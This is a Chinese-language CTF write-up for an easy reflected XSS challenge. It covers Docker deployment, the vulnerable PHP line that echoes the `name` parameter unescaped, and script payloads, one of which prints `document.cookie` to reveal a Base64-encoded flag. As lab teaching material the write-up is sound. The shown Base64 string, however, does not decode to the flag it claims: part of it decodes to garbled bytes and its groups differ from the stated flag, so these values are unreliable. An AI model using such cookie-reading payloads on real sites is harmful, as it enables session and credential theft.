# CTF 题解：反射型 XSS 

## 题目概述

这是一个简单的反射型 XSS 题目，页面接收 `name` 参数并直接回显到页面上，未做任何过滤或转义。Flag 被写入 Cookie，但经过 **Base64 编码**。参赛者需要通过 XSS 漏洞读取 Cookie 中的值，然后解码得到真正的 Flag。

- **考点**：反射型 XSS、JavaScript 操作 Cookie、Base64 解码
- **难度**：1
- **Flag 格式**：`flag{...}`

---

## 环境部署

题目提供了 Docker 环境，使用 `docker-compose` 一键启动：

```BASH
# 进入项目目录
cd web-ctf/docker
# 构建并启动容器
docker-compose up -d --build
#访问 
http://localhost:8080 即可看到题目页面

```

---

## 解题过程

### 1.漏洞发现

页面包含一个输入框，输入字符提交后会在下方显示：

    （输入字符） 不是你的名字

查看页面源代码，发现输入内容被直接插入到 `<pre>` 标签中，没有任何过滤。

源码关键片段：

```
if (array_key_exists("name", $_GET) && $_GET['name'] !== '') {
    $greeting = '<pre>' . $_GET['name'] . ' 不是你的名字</pre>';
}
```
这说明存在反射型 XSS 漏洞。尝试注入简单的 JavaScript：
```
<script>alert('XSS')</script>
```
页面弹出对话框，漏洞确认。

### 2.读取 Cookie

由于目标是将 Flag 写入 Cookie，攻击目标是读取 `document.cookie`。构造 Payload：

```
<script>document.write(document.cookie)</script>
```
提交后页面显示类似：
```
flag=ZmxhZ3s2MOZDNOJDOC1BRkQ4LThBQzMtRjIxQS1DRTZGM0FCMTMxMjd9 不是你的名字
```
其中 `ZmxhZ3s2MOZDNOJDOC1BRkQ4LThBQzMtRjIxQS1DRTZGM0FCMTMxMjd9` 就是 Base64 编码的 Flag 字符串。

### 3.解码

将获取到的字符串进行 Base64 解码得到原始 Flag：
```
flag{60F4D4BD-8AC3-ADF8-8AC3-F21A-CE6F3AB13127}
```
---
### 解题完毕
